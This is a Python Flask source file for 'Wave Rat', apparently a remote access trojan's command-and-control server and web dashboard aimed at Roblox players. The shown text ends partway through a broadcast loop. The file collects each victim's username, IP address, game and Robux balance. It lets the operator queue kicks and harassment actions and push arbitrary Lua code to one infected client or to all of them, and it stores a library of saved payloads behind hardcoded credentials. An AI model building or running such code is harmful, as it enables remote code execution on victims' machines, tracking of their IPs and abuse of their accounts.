from flask import Flask, request, jsonify, render_template_string, redirect, url_for, make_response, session
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os
import secrets

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet", logger=True, engineio_logger=True)

# ==================== CONFIG ====================
LOGIN = "entrepreneur1337"
PASSWORD = "A9f!Q3r#Zx7L"
SESSION_DURATION = 24 * 3600
HISTORY_FILE = "history_log.json"
PAYLOADS_FILE = "payloads.json"
STATS_FILE = "stats.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []
payloads = {}
peak_players = 0
total_executions = 0

def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except:
            history_log = []

def load_payloads():
    global payloads
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                payloads = json.load(f)
        except:
            payloads = {}

def load_stats():
    global peak_players, total_executions
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                peak_players = data.get("peak_players", 0)
                total_executions = data.get("total_executions", 0)
        except:
            pass

def save_stats():
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"peak_players": peak_players, "total_executions": total_executions}, f, ensure_ascii=False, indent=2)
    except:
        pass

def save_payloads():
    try:
        with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, ensure_ascii=False, indent=2)
    except:
        pass

load_history()
load_payloads()
load_stats()

def is_authenticated():
    return session.get("authenticated") is True and session.get("expires", 0) > time.time()

def require_auth(f):
    def wrapper(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

LOGIN_HTML = """<!DOCTYPE html>
<html lang="fr" class="dark">
<head>
    <meta charset="UTF-8">
    <title>Wave Rat - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 4rem;max-width:420px;width:90%;box-shadow:0 30px 80px rgba(6,182,212,.2);}
        .logo svg{width:90px;height:90px;fill:var(--primary);}
        h1{font-size:2.2rem;text-align:center;margin-bottom:2rem;color:var(--primary);}
        input{width:100%;padding:16px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-size:1rem;}
        button{width:100%;padding:16px;background:linear-gradient(135deg,#06b6d4,#0891b2);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;}
        button:hover{transform:translateY(-4px);box-shadow:0 15px 30px rgba(6,182,212,.4);}
        .error{color:#ef4444;margin-top:15px;text-align:center;}
    </style>
</head>
<body>
<div class="login-card">
    <div class="logo" style="text-align:center;margin-bottom:2rem;">
        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
        <h1>Wave Rat</h1>
    </div>
    <form method="post">
        <input type="text" name="login" placeholder="Login" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Connexion</button>
    </form>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body>
</html>"""

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if is_authenticated():
        return redirect(url_for("index"))
    if request.method == "POST":
        if request.form.get("login") == LOGIN and request.form.get("password") == PASSWORD:
            session["authenticated"] = True
            session["expires"] = time.time() + SESSION_DURATION
            resp = make_response(redirect(url_for("index")))
            resp.set_cookie("session_token", secrets.token_hex(32), max_age=SESSION_DURATION, httponly=True, samesite="Lax")
            return resp
        return render_template_string(LOGIN_HTML, error="Mauvais identifiants")
    return render_template_string(LOGIN_HTML)

@app.route("/logout")
def logout():
    resp = make_response(redirect(url_for("login_page")))
    resp.delete_cookie("session_token")
    session.clear()
    return resp

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
    if len(history_log) > 100:
        history_log.pop()
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except:
        pass
    socketio.emit("history_update", {"history": history_log[:50]})

HTML = """<!DOCTYPE html>
<html lang="fr" class="dark">
<head>
<meta charset="UTF-8">
<title>Wave Rat Dashboard</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;--robux:#fbbf24;}
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
.header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
.logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
.logo svg{width:40px;height:40px;fill:var(--primary);}
.stats{font-size:1.1rem;color:var(--text-muted);}
.stats b{font-weight:600;}
#stats-online{color:#06b6d4;}
#stats-peak{color:#f59e0b;}
#stats-total{color:#a78bfa;}
.logout-btn{padding:8px 16px;background:#ef4444;border:none;border-radius:8px;color:white;cursor:pointer;font-size:0.9rem;}
.main{flex:1;margin-top:70px;display:flex;}
.sidebar{width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0;}
.nav-item{padding:1rem 2rem;cursor:pointer;transition:all .3s;color:var(--text-muted);font-weight:500;}
.nav-item:hover{background:rgba(6,182,212,.15);color:var(--primary);}
.nav-item.active{background:rgba(6,182,212,.25);color:var(--primary);border-left:4px solid var(--primary);}
.content{flex:1;padding:2rem;overflow-y:auto;}
.search-bar{margin-bottom:20px;}
.search-bar input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;font-size:1rem;}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem;}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all .4s;position:relative;overflow:hidden;}
.card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
.status{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
.dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430;}
.dot.online{background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
.name{font-size:1.3rem;font-weight:600;margin-bottom:8px;}
.name a{color:var(--primary);text-decoration:none;}
.info{font-size:.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px;}
.robux-display{color:var(--robux);font-weight:700;font-size:1rem;display:flex;align-items:center;gap:6px;}
.robux-icon{font-size:1.1rem;}
.refresh-robux{cursor:pointer;color:var(--primary);font-size:0.85rem;text-decoration:underline;margin-left:8px;}
.refresh-robux:hover{color:var(--primary-hover);}
.category{font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:.95rem;}
.btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
.btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
.btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
.btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
.btn.undo{background:#475569;}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
.modal.active{display:flex;}
.modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:700px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
.payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
.payload-item{cursor:pointer;padding:12px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:.2s;}
.payload-item:hover{background:#334155;}
.payload-item.selected{background:var(--primary);color:black;}
.modal-buttons{display:flex;gap:1rem;margin-top:1.5rem;}
.modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;}
.confirm{background:var(--primary);color:white;}
.confirm:hover{background:var(--primary-hover);}
.cancel{background:#475569;color:white;}
.toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
.toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
@keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
.no-players{text-align:center;color:var(--text-muted);padding:3rem;font-size:1.2rem;}
</style>
</head>
<body>
<div class="header">
<div class="logo">
<svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
<div>Wave Rat</div>
</div>
<div class="stats">Players online: <b id="stats-online">0</b> • Peak: <b id="stats-peak">0</b> • Total exec: <b id="stats-total">0</b></div>
<div style="display:flex;gap:12px;align-items:center;">
<button class="btn" id="execAllBtn" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);padding:8px 20px;">Exec All</button>
<a href="/logout"><button class="logout-btn">Déconnexion</button></a>
</div>
</div>
<div class="main">
<div class="sidebar">
<div class="nav-item active" data-tab="players">Players</div>
<div class="nav-item" data-tab="workshop">Workshop</div>
<div class="nav-item" data-tab="history">History</div>
</div>
<div class="content">
<div id="players-tab" class="tab active">
<div class="search-bar"><input type="text" id="searchInput" placeholder="Rechercher..." onkeyup="filterPlayers()"></div>
<div class="grid" id="players"></div>
<div id="noPlayersMsg" class="no-players" style="display:none;">Aucun joueur connecté pour le moment...</div>
</div>
<div id="workshop-tab" class="tab" style="display:none;">
<button class="btn" id="newPayloadBtn">+ New Payload</button>
<div id="payloads-list" style="margin-top:20px;"></div>
</div>
<div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
</div>
</div>
<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="test"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Exécuter Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
<div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
<div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Nouveau Payload</h2><input type="text" id="payloadName" placeholder="Nom du payload"><textarea id="payloadCode" placeholder="Code Lua..." style="height:250px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="savePayload">Sauvegarder</button></div></div></div>
<div class="modal" id="executePayloadModal"><div class="modal-content"><h2>Importer Payload</h2><input type="text" id="payloadSearch" placeholder="Rechercher payload..." onkeyup="filterPayloads()"><div class="payload-list" id="payloadList"></div><textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir/editer le code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="executeTempPayload">Exécuter</button></div></div></div>
<div class="modal" id="execAllModal"><div class="modal-content"><h2 style="color:#c084fc;">Exécuter Lua sur TOUS les joueurs</h2><textarea id="execAllScript" placeholder="Code Lua à exécuter sur tous les clients connectés..." style="height:320px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmExecAll" style="background:linear-gradient(135deg,#8b5cf6,#7c3aed);">Exécuter sur tous</button></div></div></div>
<div class="toast-container" id="toasts"></div>
<script>
const socket=io({transports:['websocket','polling']});
let currentPlayerId=null,editingPayloadName=null;
socket.on('connect',()=>console.log("Socket connecté"));
socket.on('connect_error',err=>console.error("Erreur Socket:",err));
socket.on('disconnect',reason=>console.log("Socket déconnecté:",reason));
document.querySelectorAll('.nav-item').forEach(item=>{item.addEventListener('click',()=>{document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active'));document.querySelectorAll('.tab').forEach(t=>t.style.display='none');item.classList.add('active');document.getElementById(item.dataset.tab+'-tab').style.display='block';if(item.dataset.tab==='workshop')loadPayloads();if(item.dataset.tab==='history')socket.emit('request_history');});});
function toast(msg){const t=document.createElement('div');t.className='toast';t.textContent=msg;document.getElementById('toasts').appendChild(t);setTimeout(()=>t.remove(),4000);}
function filterPlayers(){const q=document.getElementById('searchInput')?.value?.toLowerCase()||'';document.querySelectorAll('.card').forEach(c=>{c.style.display=c.textContent.toLowerCase().includes(q)?'block':'none';});}
function refreshRobux(id){fetch('/troll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,cmd:'refreshrobux'})}).then(()=>toast('Actualisation Robux envoyée')).catch(()=>toast('Erreur actualisation'));}
document.getElementById('confirmKick').onclick=()=>{if(!currentPlayerId)return toast("Aucun joueur sélectionné");const reason=document.getElementById('kickReason').value.trim()||"Kicked by admin";fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:currentPlayerId,reason:reason})}).then(()=>{toast(`Joueur kické : ${reason}`);document.getElementById('kickModal').classList.remove('active');}).catch(err=>{console.error(err);toast('Erreur lors du kick');});};
document.getElementById('confirmSound').onclick=()=>{const assetId=document.getElementById('soundAssetId').value.trim();if(!assetId)return toast("Asset ID requis");sendTroll(currentPlayerId,'playsound',assetId);document.getElementById('playSoundModal').classList.remove('active');};
document.getElementById('confirmText').onclick=()=>{const text=document.getElementById('screenText').value.trim();if(!text)return toast("Texte requis");sendTroll(currentPlayerId,'textscreen',text);document.getElementById('textScreenModal').classList.remove('active');};
document.getElementById('confirmLua').onclick=()=>{const script=document.getElementById('luaScript').value.trim();if(!script)return toast("Script vide");sendTroll(currentPlayerId,'luaexec',script);document.getElementById('luaExecModal').classList.remove('active');};
document.getElementById('confirmImport').onclick=()=>{const file=document.getElementById('luaFileInput').files[0];if(!file)return toast("Aucun fichier");const reader=new FileReader();reader.onload=e=>{sendTroll(currentPlayerId,'luaexec',e.target.result);document.getElementById('importFileModal').classList.remove('active');};reader.readAsText(file);};
document.querySelectorAll('.modal .cancel').forEach(btn=>{btn.addEventListener('click',()=>btn.closest('.modal').classList.remove('active'));});
function loadPayloads(){fetch('/payload?action=list').then(r=>r.json()).then(data=>{const container=document.getElementById('payloads-list');container.innerHTML='';if(Object.keys(data).length===0){container.innerHTML='<p style="color:#94a3b8;padding:20px;">Aucun payload</p>';return;}Object.entries(data).forEach(([name,code])=>{const div=document.createElement('div');div.style='background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';div.innerHTML=`<strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,100)}${code.length>100?'...':''}</span><div style="margin-top:10px;display:flex;gap:8px;"><button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name.replace(/'/g,"\\'")}')">Edit</button><button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name.replace(/'/g,"\\'")}')">Suppr</button></div>`;container.appendChild(div);});}).catch(err=>{console.error(err);toast("Erreur chargement payloads");});}
window.editPayload=name=>{fetch(`/payload?action=get&name=${encodeURIComponent(name)}`).then(r=>r.json()).then(d=>{editingPayloadName=name;document.getElementById('payloadModalTitle').textContent='Modifier Payload';document.getElementById('payloadName').value=name;document.getElementById('payloadCode').value=d.code||'';document.getElementById('payloadModal').classList.add('active');}).catch(()=>toast("Erreur chargement payload"));};
window.deletePayload=name=>{if(!confirm(`Supprimer "${name}" ?`))return;fetch('/payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',name})}).then(()=>{toast('Payload supprimé');loadPayloads();}).catch(()=>toast('Erreur suppression'));};
document.getElementById('newPayloadBtn').onclick=()=>{editingPayloadName=null;document.getElementById('payloadModalTitle').textContent='Nouveau Payload';document.getElementById('payloadName').value='';document.getElementById('payloadCode').value='';document.getElementById('payloadModal').classList.add('active');};
document.getElementById('savePayload').onclick=()=>{const name=document.getElementById('payloadName').value.trim();const code=document.getElementById('payloadCode').value.trim();if(!name||!code)return toast('Nom et code requis');const payload={action:editingPayloadName?'update':'create',name,code,oldname:editingPayloadName||undefined};fetch('/payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(()=>{toast(editingPayloadName?'Modifié':'Créé');document.getElementById('payloadModal').classList.remove('active');loadPayloads();}).catch(()=>toast('Erreur sauvegarde'));};
window.openPayloadSelector=id=>{currentPlayerId=id;fetch('/payload?action=list').then(r=>r.json()).then(data=>{const list=document.getElementById('payloadList');list.innerHTML='';if(Object.keys(data).length===0){list.innerHTML='<p style="color:#94a3b8;text-align:center;padding:20px;">Aucun payload</p>';}else{Object.keys(data).forEach(name=>{const item=document.createElement('div');item.className='payload-item';item.textContent=name;item.onclick=()=>{document.querySelectorAll('.payload-item').forEach(el=>el.classList.remove('selected'));item.classList.add('selected');fetch(`/payload?action=get&name=${encodeURIComponent(name)}`).then(r=>r.json()).then(d=>document.getElementById('tempPayloadCode').value=d.code||'');};list.appendChild(item);});}document.getElementById('executePayloadModal').classList.add('active');}).catch(()=>toast('Erreur chargement payloads'));};
function filterPayloads(){const q=document.getElementById('payloadSearch').value.toLowerCase();document.querySelectorAll('.payload-item').forEach(i=>{i.style.display=i.textContent.toLowerCase().includes(q)?'':'none';});}
document.getElementById('executeTempPayload').onclick=()=>{const code=document.getElementById('tempPayloadCode').value.trim();if(!code)return toast('Aucun code');sendTroll(currentPlayerId,'luaexec',code);document.getElementById('executePayloadModal').classList.remove('active');};
function sendTroll(id,cmd,param=null){const body={userid:id,cmd};if(param!==null){if(cmd==='playsound')body.assetId=param;else if(cmd==='textscreen')body.text=param;else if(cmd==='luaexec')body.script=param;}fetch('/troll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});toast(`${cmd.toUpperCase()} envoyé`);}
function openKickModal(id){currentPlayerId=id;document.getElementById('kickModal').classList.add('active');}
function openPlaySoundModal(id){currentPlayerId=id;document.getElementById('playSoundModal').classList.add('active');}
function openTextScreenModal(id){currentPlayerId=id;document.getElementById('textScreenModal').classList.add('active');}
function openLuaExecModal(id){currentPlayerId=id;document.getElementById('luaExecModal').classList.add('active');}
function openImportFileModal(id){currentPlayerId=id;document.getElementById('importFileModal').classList.add('active');}
document.getElementById('execAllBtn').onclick=()=>{document.getElementById('execAllScript').value='';document.getElementById('execAllModal').classList.add('active');};
document.getElementById('confirmExecAll').onclick=()=>{const script=document.getElementById('execAllScript').value.trim();if(!script)return toast('Script vide');fetch('/exec_all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({script})}).then(r=>r.json()).then(d=>{if(d.sent)toast(`Envoyé à ${d.count} joueur(s)`);else toast('Erreur');document.getElementById('execAllModal').classList.remove('active');});};
function render(data){if(!data)return;document.getElementById('stats-online').innerText=data.online||0;document.getElementById('stats-peak').innerText=data.peak||0;document.getElementById('stats-total').innerText=data.total_exec||0;const grid=document.getElementById('players');const noMsg=document.getElementById('noPlayersMsg');if(!data.players||Object.keys(data.players).length===0){grid.innerHTML='';noMsg.style.display='block';return;}noMsg.style.display='none';const current=new Set(Object.keys(data.players));document.querySelectorAll('.card').forEach(c=>{if(!current.has(c.id.replace('card_','')))c.remove();});Object.entries(data.players).forEach(([id,p])=>{let card=document.getElementById(`card_${id}`);if(!card){card=document.createElement('div');card.className='card';card.id=`card_${id}`;grid.appendChild(card);}const online=!!p.online;const robuxDisplay=p.robux?`<div class="robux-display"><span class="robux-icon">💰</span> Robux: ${p.robux}<span class="refresh-robux" onclick="refreshRobux('${id}')">🔄 Refresh</span></div>`:'';card.innerHTML=`<div class="status"><div class="dot ${online?'online':''}"></div><span>${online?'Online':'Offline'}</span></div><div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username||'Inconnu'}</a> (${id})</div><div class="info">Executor: ${p.executor||'?'}<br>IP: ${p.ip||'?'}<br>Game: <a href="https://www.roblox.com/games/${p.gameId||0}" target="_blank">${p.game||'N/A'}</a><br>JobId: ${p.jobId||'N/A'}<br>${robuxDisplay}</div><div class="category">TROLLS</div><div class="btn-grid"><button class="btn kick" onclick="openKickModal('${id}')">KICK</button><button class="btn" onclick="sendTroll('${id}','freeze')">FREEZE</button><button class="btn" onclick="sendTroll('${id}','spin')">SPIN</button><button class="btn" onclick="sendTroll('${id}','jump')">JUMP</button><button class="btn" onclick="sendTroll('${id}','rainbow')">RAINBOW</button><button class="btn" onclick="sendTroll('${id}','explode')">EXPLODE</button><button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button><button class="btn" onclick="openPlaySoundModal('${id}')">SOUND</button><button class="btn" onclick="openTextScreenModal('${id}')">TEXT</button></div><div class="category">UNDO</div><div class="btn-grid"><button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button><button class="btn undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button><button class="btn undo" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button><button class="btn undo" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button><button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button><button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button></div><div class="category">LUA</div><div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr"><button class="btn" onclick="openImportFileModal('${id}')">FILE</button><button class="btn" onclick="openLuaExecModal('${id}')">EXEC</button><button class="btn" onclick="openPayloadSelector('${id}')">PAYLOAD</button></div>`;});}
socket.on('update',render);
socket.on('history_update',d=>{document.getElementById('history').innerHTML=d.history.map(h=>`<div style="background:#1e293b;padding:12px;border-radius:12px;margin-bottom:8px;"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');});
</script>
</body>
</html>"""

@app.route("/")
@require_auth
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    global total_executions
    now = time.time()
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) or {}
            uid = str(data.get("userid", ""))
            action = data.get("action")
            if action == "register" and uid:
                connected_players[uid] = {
                    "username": data.get("username", "Unknown"),
                    "executor": data.get("executor", "Unknown"),
                    "ip": data.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": data.get("game", "Unknown"),
                    "gameId": data.get("gameId", 0),
                    "jobId": data.get("jobId", "Unknown"),
                    "robux": data.get("robux", "?")
                }
                add_history("connect", connected_players[uid]["username"], f"Connecté depuis {data.get('game', '?')} • Robux: {data.get('robux', '?')}")
            elif action == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
                total_executions += 1
            elif action == "updaterobux" and uid in connected_players:
                new_robux = data.get("robux", "?")
                connected_players[uid]["robux"] = new_robux
                add_history("action", connected_players[uid]["username"], f"Robux actualisé: {new_robux}")
        except Exception as e:
            print(f"Erreur POST /api : {e}")
        return jsonify({"ok": True})
    uid = request.args.get("userid", "")
    if not uid:
        return jsonify({})
    if uid in pending_kicks:
        reason = pending_kicks.pop(uid, "Kicked")
        return jsonify({"command": "kick", "reason": reason})
    if uid in pending_commands:
        cmd = pending_commands.pop(uid)
        res = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
        if isinstance(cmd, dict):
            for key in ["assetId", "text", "script"]:
                if key in cmd:
                    res[key] = cmd[key]
        return jsonify(res)
    return jsonify({})

@app.route("/kick", methods=["POST"])
@require_auth
def kick():
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    if uid in connected_players:
        pending_kicks[uid] = reason
        name = connected_players[uid].get("username", "Unknown")
        add_history("action", name, f"KICKED: {reason}")
        socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
        return jsonify({"sent": True})
    return jsonify({"error": "Joueur non trouvé"}), 404

@app.route("/troll", methods=["POST"])
@require_auth
def troll():
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd and uid in connected_players:
        payload = {"cmd": cmd}
        details = cmd.upper()
        if "assetId" in data: payload["assetId"] = data["assetId"]; details += f" ({data['assetId']})"
        if "text" in data: payload["text"] = data["text"]; details += f" ({data['text']})"
        if "script" in data: payload["script"] = data["script"]; details += " (Lua)"
        pending_commands[uid] = payload
        name = connected_players[uid].get("username", "Unknown")
        add_history("action", name, details)
        return jsonify({"sent": True})
    return jsonify({"error": "Invalid"}), 400

@app.route("/exec_all", methods=["POST"])
@require_auth
def exec_all():
    data = request.get_json() or {}
    script = data.get("script", "").strip()
    if not script:
        return jsonify({"error": "Script vide"}), 400
    now = time.time()
    count = 0
    for uid, player in connected_players.items():
        if now - player.get("last", 0) < 30:
            pending_commands[uid] = {"cmd": "luaexec", "script": script}
            count += 1
    if count > 0:
        add_history("action", "ADMIN", f"EXEC ALL → {count} clients (Lua)")
        socketio.emit("kick_notice", {"username": "ALL", "reason": "LUA EXEC ALL"})
    return jsonify({"sent": True, "count": count})

@app.route("/payload", methods=["GET", "POST"])
@require_auth
def payload():
    if request.method == "GET":
        action = request.args.get("action")
        if action == "list":
            return jsonify(payloads)
        if action == "get":
            name = request.args.get("name", "")
            return jsonify({"code": payloads.get(name, "")})
        return jsonify({"error": "action invalide"})
    data = request.get_json() or {}
    action = data.get("action")
    if action == "create":
        payloads[data["name"]] = data["code"]
    elif action == "update":
        old = data.get("oldname")
        if old and old in payloads:
            del payloads[old]
        payloads[data["name"]] = data["code"]
    elif action == "delete":
        payloads.pop(data.get("name"), None)
    else:
        return jsonify({"error": "action invalide"}), 400
    save_payloads()
    return jsonify({"ok": True})

def broadcast_loop():
    global peak_players
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in list(connected_players.items()):
